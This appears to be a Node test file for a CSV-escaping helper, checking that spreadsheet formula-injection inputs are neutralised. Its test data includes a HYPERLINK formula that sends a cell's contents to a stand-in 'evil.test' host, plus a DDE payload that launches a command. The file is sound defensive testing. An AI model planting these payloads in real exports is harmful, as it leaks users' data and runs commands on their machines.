import { test } from "node:test";
import assert from "node:assert/strict";
import { escapeCsvField, csvRow } from "./csv";

test("S10 — every formula trigger character is neutralised", () => {
  // The full set a spreadsheet treats as "this cell is a formula".
  for (const prefix of ["=", "+", "-", "@", "\t", "\r"]) {
    const out = escapeCsvField(`${prefix}HYPERLINK("http://evil","click")`);
    assert.ok(out.startsWith(`"'`), `${JSON.stringify(prefix)} was not neutralised: ${out}`);
  }
});

test("S10 — the classic exfiltration and DDE payloads are defused", () => {
  const hyperlink = escapeCsvField('=HYPERLINK("http://evil.test?x="&A1,"Click")');
  assert.ok(hyperlink.startsWith(`"'=HYPERLINK`), hyperlink);

  const dde = escapeCsvField("=cmd|' /C calc'!A0");
  assert.ok(dde.startsWith(`"'=cmd`), dde);

  // Neither must survive as something a parser hands back as a formula.
  for (const out of [hyperlink, dde]) {
    assert.ok(!out.startsWith('"='), "a quoted formula still evaluates once quotes are stripped");
  }
});

test("S10 — the apostrophe goes INSIDE the quotes, or it does nothing", () => {
  // "'=x" is neutralised. "'" + "\"=x\"" would put the marker outside the
  // quoted field, where the parser drops it and the formula survives.
  const out = escapeCsvField("=1+1");
  assert.equal(out, `"'=1+1"`);
});

test("S10 — ordinary values are untouched, so the export stays readable", () => {
  assert.equal(escapeCsvField("MFA Enforcement"), "MFA Enforcement");
  assert.equal(escapeCsvField("AC-2"), "AC-2");
  assert.equal(escapeCsvField("75%"), "75%");
  assert.equal(escapeCsvField(""), "");
});

test("S10 — numbers pass through unquoted so the spreadsheet can still sum them", () => {
  // A negative number would trip the formula rule if it were stringified
  // first — quoting it as "'-5000" would break every SUM in the sheet.
  assert.equal(escapeCsvField(-5000), "-5000");
  assert.equal(escapeCsvField(0), "0");
  assert.equal(escapeCsvField(4189000), "4189000");
});

test("S10 — normal CSV escaping still works", () => {
  assert.equal(escapeCsvField("Acme, Inc."), '"Acme, Inc."');
  assert.equal(escapeCsvField('He said "hi"'), '"He said ""hi"""');
  assert.equal(escapeCsvField("line one\nline two"), '"line one\nline two"');
  assert.equal(escapeCsvField("carriage\rreturn"), '"carriage\rreturn"');
});

test("S10 — a value that is both a formula and contains quotes is handled once", () => {
  const out = escapeCsvField('=A1&"x"');
  assert.equal(out, `"'=A1&""x"""`);
});

test("S10 — a row joins fields without letting one leak into the next", () => {
  assert.equal(csvRow(["Control", "Coverage"]), "Control,Coverage");
  assert.equal(csvRow(["=cmd", 75]), `"'=cmd",75`);
  assert.equal(csvRow(["a,b", "c"]), '"a,b",c');
});

test("S10 — a leading character mid-string is not a formula and is left alone", () => {
  // Only the FIRST character matters to a spreadsheet; over-escaping would
  // mangle legitimate text like an email address or a range description.
  assert.equal(escapeCsvField("owner@example.com"), "owner@example.com");
  assert.equal(escapeCsvField("5-10 days"), "5-10 days");
});
